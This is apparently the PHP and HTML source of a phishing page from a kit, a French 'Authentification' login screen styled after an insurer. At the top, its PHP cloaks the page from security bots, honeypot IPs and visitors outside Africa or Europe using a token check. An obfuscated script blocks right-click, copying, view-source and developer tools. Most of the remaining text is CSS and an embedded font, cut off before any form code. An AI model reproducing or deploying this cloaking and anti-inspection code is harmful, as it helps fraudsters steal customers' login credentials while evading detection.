<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$ip = $_SERVER['REMOTE_ADDR'];
session_id(md5($ip));
session_start();

$stripos = 0;
include 'config.php';


require_once './includes/HunterObfuscator.php'; //Include the class

$jsCode = " jQuery(function($){ document.addEventListener('contextmenu', event => event.preventDefault()); document.onkeydown = function(e) { if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 117 || e.keyCode === 44)) { return false; } else { return true; } }; $(document).keydown(function (event) { if (event.keyCode == 123) { return false; } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { return false; } }); }) "; //Simple JS code

$hunter = new HunterObfuscator($jsCode); //Initialize with JS code in parameter
$hunter->addDomainName($_SERVER['HTTP_HOST']);
$obsfucated = $hunter->Obfuscate(); //Do obfuscate and get the obfuscated code


$permitted_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_~";


$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = '403.php';
$hostname = gethostbyaddr($ip);

if (stripos($honeypotbots, $ip) !== false) {
	
   $stripos = $stripos + 1;

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));

if ($_SESSION['continentCode'] !== 'AF' && $_SESSION['continentCode'] !== 'EU')
{
      $stripos = $stripos + 1;
} 



if ($token1 != $_GET['token'] || $stripos > 0 ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }



$_SESSION['choice'] = $_GET['choice'];


?>
<!DOCTYPE html> 
<html lang="fr">
    <head>
        <meta charset="utf-8">
        <title>Authentification</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="robots" content="noindex, follow">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <style>
           

            .accessi {
                -webkit-clip-path: inset(50%);
                clip-path: inset(50%);
                white-space: nowrap
            }

          
            .c-btn {
                align-items: center;
                font: inherit;
                font-size: 13px;
                height: 35px;
                justify-content: center;
                max-width: 230px;
                transition: all .25s ease-in-out
            }

            @media(min-width: 46.25em) {
                .c-btn {
                    font-size:14px
                }
            }

            .c-btn:active,.c-btn:focus,.c-btn:hover {
                outline: 0;
                text-decoration: none
            }

            @keyframes dothabottomcheck {
                0% {
                    height: 0
                }

                to {
                    height: 12.5px
                }
            }

            @keyframes dothatopcheck {
                0% {
                    height: 0
                }

                50% {
                    height: 0
                }

                to {
                    height: 25px
                }
            }


            .c-svg {
                color: currentColor
            }

            @keyframes rotating {
                0% {
                    transform: rotate(0deg)
                }

                to {
                    transform: rotate(1turn)
                }
            }


            @keyframes spin {
                to {
                    transform: rotate(1turn)
                }
            }


            :root {
                --icon-xs: 1.2rem;
                --icon-sm: 1.6rem;
                --icon-md: 2.4rem;
                --icon-lg: 2.8rem;
                --icon-xl: 3.7rem;
                --icon-xxl: 5.5rem;
                --icon-xxxl: 8rem;
                --img-xs: 9.6rem;
                --img-sm: 12.8rem;
                --img-md: 16rem;
                --img-lg: 19.2rem;
                --img-xl: 22.4rem;
                --img-xxl: 25.6rem;
                --container-width: 73rem
            }

            :root {
                --c-link-width: 2.5rem
            }

            :root {
                --box-shadow-nav: -2px -6px 9px 0#00000080;
                --box-shadow-primary: 0 2px 10px 0#00000029;
                --box-shadow-teaser: 0 15px 40px 0#0000001a;
                --spacing-base: 2rem;
                --spacing-xxxxs: calc(var(--spacing-base)/10);
                --spacing-xxxs: calc(var(--spacing-base)/5);
                --spacing-xxs: calc(var(--spacing-base)/4);
                --spacing-xs: calc(var(--spacing-base)/3);
                --spacing-sm: calc(var(--spacing-base)/2);
                --spacing-md: var(--spacing-base);
                --spacing-lg: calc(var(--spacing-base)*2);
                --spacing-xl: calc(var(--spacing-base)*3)
            }

            :root {
                --color-a-link: var(--color-primary-contrast);
                --color-a-link-hover: var(--color-primary-darker);
                --color-a-link-focus: var(--color-primary-darker);
                --color-btn-primary: var(--color-primary);
                --color-btn-primary-hover: var(--color-primary-dark);
                --color-btn-primary-focus: var(--color-primary-darker);
                --btn-border-radius: var(--border-radius-lg);
                --btn-outlined-color: var(--color-primary);
                --btn-outlined-border-color: var(--color-primary);
                --color-btn-primary-outlined-bg-hover: var(--color-white);
                --color-btn-primary-outlined-txt-hover: var(--color-primary-dark);
                --color-btn-primary-outlined-hover: var(--color-primary-dark);
                --color-btn-secondary: var(--color-primary);
                --btn-secondary-border-color: var(--color-primary);
                --color-btn-secondary-hover: var(--color-primary-dark);
                --color-btn-secondary-bg-hover: var(--color-white);
                --color-btn-secondary-txt-hover: var(--color-primary-dark);
                --color-btn-secondary-focus: var(--color-primary-darker);
                --color-btn-secondary-bg-focus: var(--color-white);
                --color-btn-secondary-txt-focus: var(--color-primary-darker);
                --color-btn-tertiary: var(--color-primary-contrast);
                --color-btn-tertiary-hover: var(--color-primary-darker);
                --color-btn-tertiary-focus: var(--color-primary-darker);
                --color-input-border: var(--color-secondary-dark);
                --color-input-hover: var(--color-black);
                --bordercolor-segment-hover: var(--color-input-hover);
                --color-segment-hover: var(--color-text);
                --bgcolor-segment-checked: var(--color-secondary);
                --color-segment-checked: var(--color-secondary-lighter);
                --checkbox-checked-color: var(--color-text);
                --checkbox-border-color: var(--color-input-border);
                --pager-border-color: var(--color-input-border);
                --pager-border-color-hover: var(--color-input-hover);
                --message-border-color: #e6e6e6;
                --message-bg-color: #fff;
                --message-icon-color: var(--color-primary);
                --back-link-padding: .2rem;
                --background-select: url(data:image/svg+xml;charset=utf-8,%3Csvg\ xmlns=\'http://www.w3.org/2000/svg\'\ width=\'24\'\ height=\'24\'\ fill=\'%23E03136\'\ viewBox=\'0\ 0\ 24\ 24\'%3E%3Cpath\ d=\'M6.997\ 21.414.29\ 14.707l1.414-1.414\ 5.293\ 5.293\ 5.293-5.293\ 1.414\ 1.414zm5.3-10.707L7.004\ 5.414l-5.293\ 5.293L.297\ 9.293l6.707-6.707\ 6.707\ 6.707z\'/%3E%3C/svg%3E);
                --steps-item-size-desktop: 4rem;
                --steps-item-upcoming-background-color: var(--color-secondary-darker);
                --steps-item-upcoming-number-color: var(--color-white);
                --header-btn-radius: var(--border-radius-xs);
                --header-btn-color: var(--color-primary);
                --header-btn-color-focus: var(--color-primary-dark);
                --header-profil-border-color: var(--color-secondary-light);
                --header-profil-border-radius: 3px;
                --header-profil-border-padding-right: 0;
                --header-profil-color: inherit;
                --header-profil-connexion-color: var(--color-text-light);
                --login-background-color: var(--color-white);
                --login-icon-margin-right: var(--spacing-xxxs);
                --chip-border-radius: var(--border-radius-sm);
                --deletable-chip-border-radius: var(--border-radius-lg);
                --deletable-chip-btn-border-radius: var(--border-radius-circle);
                --deletable-chip-outlined-font-color: var(--color-secondary);
                --deletable-chip-outlined-bg-color: var(--color-white);
                --deletable-chip-outlined-border-color: var(--color-secondary-light);
                --deletable-chip-outlined-btn-bg-color: var(--color-white);
                --deletable-chip-outlined-btn-bg-color-hover: var(--color-secondary);
                --deletable-chip-outlined-btn-icon-color-hover: var(--color-white);
                --deletable-chip-filled-font-color: var(--color-secondary);
                --deletable-chip-filled-bg-color: var(--color-secondary-light);
                --deletable-chip-filled-border-color: var(--color-secondary-light);
                --deletable-chip-filled-btn-bg-color: var(--color-white);
                --deletable-chip-filled-btn-bg-color-hover: var(--color-secondary);
                --deletable-chip-filled-btn-icon-color-hover: var(--color-white);
                --deletable-chip-filled-dark-font-color: var(--color-white);
                --deletable-chip-filled-dark-bg-color: var(--color-secondary);
                --deletable-chip-filled-dark-border-color: var(--color-secondary);
                --deletable-chip-filled-dark-btn-bg-color: var(--color-secondary);
                --deletable-chip-filled-dark-btn-bg-color-hover: var(--color-white);
                --deletable-chip-filled-dark-btn-icon-color-hover: var(--color-secondary);
                --tile-border-radius: var(--border-radius-md);
                --manage-file-type-background-color: var(--color-secondary-lighter);
                --espace-label-color: var(--color-text);
                --espace-action-color: var(--color-text);
                --espace-label-hover-color: var(--color-secondary-hover);
                --espace-background-color: var(--color-secondary);
                --espace-background-color-desktop: var(--color-secondary-light);
                --espace-hover-background-color: #efefef;
                --input-amount-explicit-after-color: var(--color-secondary-darker);
                --t-menu-item-bg-color: var(--color-secondary-lighter);
                --t-menu-child-border-bottom-color: var(--color-secondary-lighter);
                --t-menu-child-level2-border-bottom-color: var(--color-secondary-light);
                --t-menu-child-level2-font-weight: normal;
                --t-menu-item-dropdown-arrow-color: var(--color-secondary-dark);
                --t-menu-item-hr-color: var(--color-secondary-light);
                --scrollbar-background-color: var(--color-secondary-lighter);
                --svg-stroke-width: 1px;
                --tabs-special-border-radius: var(--border-radius-md);
                --heading-font-family: var(--font-family);
                --ux-closable-base-default-size_md: 3.3rem;
                --ux-closable-base-focus-outline-border-width: 0px;
                --ux-closable-base-default-border-radius_md: var(--border-radius-circle);
                --ux-closable-base-default-background-color: var(--color-white);
                --ux-closable-base-default-icon-size_md: 1.5rem;
                --ux-closable-base-default-icon-color: var(--color-secondary);
                --ux-closable-base-hover-background-color: var(--color-secondary);
                --ux-closable-base-hover-icon-color: var(--color-white);
                --ux-closable-base-focus-background-color: var(--color-secondary);
                --ux-closable-base-focus-icon-color: var(--color-white);
                --m-closable-outline-offset: 4px;
                --ux-closable-base-focus-outline-size_md: calc(var(--ux-closable-base-default-size_md) + var(--m-closable-outline-offset));
                --ux-closable-base-focus-outline-border: 1px solid var(--color-secondary);
                --ux-closable-base-focus-outline-border-radius_md: var(--border-radius-circle);
                --ux-closable-base-default-size_sm: 2.2rem;
                --ux-closable-base-default-border-radius_sm: var(--border-radius-circle);
                --ux-closable-base-default-icon-size_sm: .9rem;
                --m-closable-small-baseline-svg: .55px;
                --ux-closable-base-focus-outline-size_sm: calc(var(--ux-closable-base-default-size_sm) + var(--m-closable-outline-offset));
                --ux-closable-base-focus-outline-border-radius_sm: var(--border-radius-circle);
                --ux-closable-base-focus-size_sm: var(--ux-closable-base-default-size_sm)
            }

            .auth {
                --t-header-height--auth: 10rem
            }

            @media(min-width: 1020px) {
                .auth {
                    --t-header-height--auth:6rem
                }
            }

            .auth .o-layout-main {
                margin-left: 0;
                width: 100%
            }

            .auth .o-footer {
                --t-footer-height: auto;
                align-items: center;
                justify-content: center
            }

            .na-hero {
                position: absolute;
                z-index: -10
            }

            @media(min-width: 1090px) {
                .na-hero {
                    background-image:url(./bg.png);
                    background-position: 50%;
                    background-repeat: no-repeat;
                    background-size: cover;
                    height: 460px;
                    left: 50%;
                    margin-left: -50vw;
                    padding-top: 20px;
                    top: -2rem;
                    width: 100vw
                }
            }

            .na-authent-dock {
                margin: 20px auto 0;
                width: 100%
            }

            @media(min-width: 1090px) {
                .na-authent-dock {
                    background-color:#ffffff1a;
                    border-radius: 20px;
                    position: relative;
                    width: 500px;
                    z-index: 10
                }
            }

            .na-authent-dock .c-auth {
                height: 100%;
                margin-bottom: 40px
            }

            :root {
                --t-header-height: 6.5rem;
                --t-espace-height: 0rem;
                --t-footer-flex-justify: center
            }

            @media(min-width: 1020px) {
                :root {
                    --t-header-height:6rem
                }
            }

            @media(min-width: 1020px) {
                .o-layout {
                    display:flex
                }
            }

            @media(max-width: 1020px) {
            }

            .o-layout-main {
                display: flex;
                flex-flow: column;
                justify-content: space-between;
                padding: 2rem;
                position: relative
            }

            @media(min-width: 770px) {
                .o-layout-main {
                    margin-left:auto;
                    margin-right: auto;
                    width: 730px
                }
            }

            @media(min-width: 1020px) {
                .o-layout-main {
                    margin-left:2rem;
                    padding: 2rem 0 0
                }
            }

            @media(min-width: 1170px) {
                .o-layout-main {
                    margin-left:6rem
                }
            }

            @media(min-width: 1490px) {
                .o-layout-main {
                    margin-left:10%
                }
            }

            @media(min-width: 1601px) {
                .o-layout-main {
                    margin-left:14%
                }
            }

           
            .auth .o-footer {
                color: var(--color-axa-blue);
                display: block;
                margin: inherit;
                max-width: inherit
            }

            body:not(.auth) .o-footer {
                background-color: var(--color-ocean-blue);
                bottom: 1.5rem;
                color: var(--color-white);
                display: block;
                font-weight: 700;
                padding-top: 2rem
            }

            .auth .o-footer a {
                color: var(--color-primary);
                display: block;
                text-transform: uppercase
            }

            body:not(.auth) .o-footer a {
                color: var(--color-white);
                display: block;
                font-size: 1.4rem;
                font-weight: 400;
                line-height: 1.3
            }

            .auth .o-footer a:hover {
                color: var(--color-primary)
            }

            .auth .o-footer a:hover,body:not(.auth) .o-footer a:hover {
                text-decoration: underline
            }

            #footer-desktop {
                --t-footer-width-col: 40rem;
                --t-footer-margin: 0;
                --t-footer-padding: 0;
                --t-footer-flex-justify: center;
                --t-footer-flex-align: center;
                --t-footer-border-top: 0;
                --t-footer-background: #0000;
                --t-footer-color: var(--color-text-light);
                --t-footer-border: 0;
                --t-footer-box-shadow: none;
                --t-footer-link-font-size: 1.3rem
            }

            @media(min-width: 1020px) {
            }

            @font-face {
                font-family: Source Sans Pro;
                font-style: normal;
                font-weight: 400;
                src: local("Source Sans Pro Regular"),local("SourceSansPro-Regular"),url(data:binary/octet-stream;base64,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